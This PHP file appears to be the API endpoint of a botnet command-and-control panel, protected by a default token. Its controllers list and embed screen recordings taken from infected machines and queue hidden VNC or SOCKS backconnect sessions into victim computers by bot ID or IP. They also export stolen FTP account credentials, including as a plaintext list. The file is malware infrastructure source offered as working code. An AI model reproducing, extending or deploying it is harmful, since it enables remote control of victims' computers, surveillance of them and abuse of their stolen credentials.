<?php
/** API interface
 * Usage:
 * api.php/<security-token>/<controller>/<action>[.extension]?<params>
 * 
 * 	security-token: the predefined token for security
 * 	controller: name of the class to use: '*Controller'
 * 	action: method name within the class
 * 	extension: on of the predefined output-formatters. Optional.
 * 			When omitted, the debug output is available.
 * 			Available formatters: .dump, .php, .json, .xml
 * 	params: named parameters to the method
 * 
 * Defined Controllers: 
 * 	VideoController
 * 		api.php/<token>/video/list?botnet=AES&botIP=1.2.3.4
 * 		api.php/<token>/video/list?botnet=AES&botId=WIN-ABC123
 * 		api.php/<token>/video/list?botnet=AES&botId=WIN-ABC123&embed=1
 * 		api.php/<token>/video/embed?botnet=AES&botId=WIN-ABC123&video=balakhan.webm
 * 	VNCController
 * 		api.php/<token>/vnc/connect?botIP=1.2.3.4&protocol=VNC
 * 		api.php/<token>/vnc/connect?botIP=1.2.3.4&protocol=SOCKS
 * 		api.php/<token>/vnc/connect?botId=WIN-ABC123&protocol=VNC
 *  IFramerController:
 *      api.php/<token>/iframer/ftpList
 *      api.php/<token>/iframer/ftpList?state=all
 *      api.php/<token>/iframer/ftpList?date_from=2012-12-31
 *      api.php/<token>/iframer/ftpList?date_from=2012-12-31&state=all
 *      api.php/<token>/iframer/ftpList?date_from=2012-12-31&state=all&plaintext=1
 */
define('API_TOKEN_KEY', 'changethispassword');

$API_TOKEN_KEYS = array(
	'video' => API_TOKEN_KEY,
	'vnc' => API_TOKEN_KEY,
	'iframer' => API_TOKEN_KEY,
	);

/* Environment */
require_once('system/global.php');
if(!@include_once('system/config.php'))die('Hello! How are you?');
if(!connectToDb())die(mysqlErrorEx());

require 'system/lib/db.php';
require 'system/lib/dbpdo.php';
require 'system/lib/MVC.php';

/* path info */
if (!isset($_SERVER['PATH_INFO']))
	die(':)');
$components = array(
	'.' => 'dump', // default extension
	'token_key' => '',
	'controller' => '',
	'action' => '',
	);
$component_names = array_keys($components);
foreach (explode('/', $_SERVER['PATH_INFO']) as $c)
	if (strlen($c = trim($c)))
		$components[ next($component_names) ] = $c;
if (strpos($components['action'], '.') !== FALSE)
	list($components['action'], $components['.']) = explode('.', $components['action'], 2);

/* Security */
if (!isset(  $API_TOKEN_KEYS[  $components['controller']  ])
		|| $API_TOKEN_KEYS[  $components['controller']  ] != $components['token_key'])
	return http_error(403, 'Unauthorized', 'Invalid security token');

/* PHP errors */
if ($components['.'] == 'dump'){
	// Only allowed in .dump
	error_reporting(E_ALL);
	ini_set('display_errors', 1);
	} else {
	error_reporting(0);
	ini_set('display_errors', 0);
	}

/* Routing */
try {
	$router = Router::forClass($components['controller']);
	$response = $router->invoke($components['action'], $_REQUEST);
	if (FALSE === $response)
		return;
	}
	catch (NoControllerRouteException $e)	{ return http_error400('Unknown controller: '.$e->getMessage()); }
	catch (NoMethodRouteException $e)		{ return http_error400('Unknown method: '.$e->getMessage()); }
	catch (ParamRequiredRouteException $e)	{ return http_error400('Missing param: '.$e->getMessage()); }
	catch (ShouldBeArrayRouteException $e)	{ return http_error400('Param should be an array: '.$e->getMessage()); }
	catch (ActionException $e) { return http_error400($e->getMessage()); }

// Format the response
switch ($components['.']){
	case 'dump':
		var_dump($response);
		break;
	case 'php':
		print var_export($response, 1);
		break;
	case 'json':
		header('Content-Type: application/json;charset=UTF-8');
		header('Allow-Origin: *');
		print json_encode($response);
		break;
	case 'xml':
		header('Content-Type: application/xml;charset=UTF-8');
		print XMLdata($response, $components['action'])->asXML();
		break;
	default:
		return http_error400('Unsupported format');
	}





/* Controllers */
class VideoController {
	function __construct(){
		$this->files = $GLOBALS['config']['reports_path'].'/files';
		$this->url = 'http://'.$_SERVER['HTTP_HOST'].dirname($_SERVER['SCRIPT_NAME']);
		}
	
	/** Search for videos by botnet/botId or botnet/botIP
	 * Set $embed=1 to include embed-codes into the output
	 */
	function actionList($botId = null, $botIP = null, $botnet = '*', $embed = false){
		# Find BotID by IP
		if (is_null($botId) && !is_null($botIP))
			if (is_null($botId = bot_ip2id($botIP)))
				throw new ActionException('BotIP not found');
		# Still not found?
		if (is_null($botId))
			return array();
		# List videos for $botId
		$ret = array(
			'botnet' => $botnet,
			'botId' => $botId,
			'videos' => array(),
			);
		$files_ = glob("{$this->files}/$botnet/$botId/*.webm");
		if ($files_ === FALSE) $files_ = array();
		foreach ($files_ as $f)
			if ($embed)
				$ret['videos'][] = array('file' => $f, 'embed' => $this->actionEmbed($botId, basename($f), $botnet));
				else
				$ret['videos'][] = basename($f);
		return $ret;
		}
	
	/** Get the embed-code for a video, previously found by the `List` operation
	 */
	function actionEmbed($botId, $video, $botnet = '*'){
		$files = glob("{$this->files}/$botnet/$botId/$video");
		if ($files === FALSE || count($files) == 0)
			throw new ActionException("File not found: '$botnet/$botId/$video'");
		$file = array_shift($files);
		$file_url = "{$this->url}/$file";
		return '<video controls><source src="'.htmlentities($file_url).'" type=\'video/webm; codecs="vp8, vorbis"\'/><a href="'.htmlentities($file_url).'" class="video-fallback">Download Video</a></video>';
		}
	}


class VNCController {
	/** Create a bot backconnect task
	 */
	function actionConnect($botId = null, $botIP = null, $protocol = 'VNC'){
		if (is_null($botId) && !is_null($botIP))
			if (is_null($botId = bot_ip2id($ip)))
				throw new ActionException('BotIP not found');
		$d = array(
			'botid' => $botId,
			'protocol' => $protocol=='SOCKS' ? 5 : 1,
			'do_connect' => 1,
			);
		if (!mysql_query(mkquery('REPLACE INTO `vnc_bot_connections` VALUES({s:botid}, {i:protocol}, {i:do_connect}, 0, 0, 0);', $d)))
			throw new ActionException('Query error');
		return array('status' => 'ok');
		}
	}


class IFramerController {
	/** Fetch FTP accounts
	 * @param string $date_from Date filter: only accounts that were found >= this date. Example: "2012-12-31"
	 * @param string $state Accounts state: 'all', 'valid', 'iframed'
	 */
	function actionFtpList($date_from = null, $state = 'all', $plaintext = 0){
		$db = dbPDO::singleton();
		$q = $db->prepare('
			SELECT `id`, `found_at`, `ftp_acc`
			FROM `botnet_rep_iframer` `f`
			WHERE
				(:date_from IS NULL OR `found_at` >= UNIX_TIMESTAMP(:date_from)) AND
				(
					(:state = "valid" AND `is_valid`=1) OR
					(:state = "iframed" AND `s_page_count`>0) OR
					:state = "all"
					)
			');
		$q->execute(array('date_from' => $date_from, 'state' => $state));

		$ret = $q->fetchAll(PDO::FETCH_OBJ);

		# Stupid plaintext format?
		if ($plaintext){
			foreach($ret as $row)
				echo "{$row->ftp_acc}\n";
			return FALSE; # no format
		}

		return $ret;
	}
}